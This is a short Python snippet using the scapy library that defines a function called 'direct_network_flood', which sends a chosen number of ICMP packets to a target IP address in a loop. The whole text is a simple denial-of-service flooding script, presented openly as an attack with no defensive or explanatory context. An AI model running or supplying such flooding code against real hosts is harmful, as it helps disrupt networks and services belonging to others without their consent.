from scapy.all import IP, ICMP, send

def direct_network_flood(target_ip, num_packets):
    for i in range(num_packets):
        packet = IP(dst=target_ip)/ICMP()
        send(packet)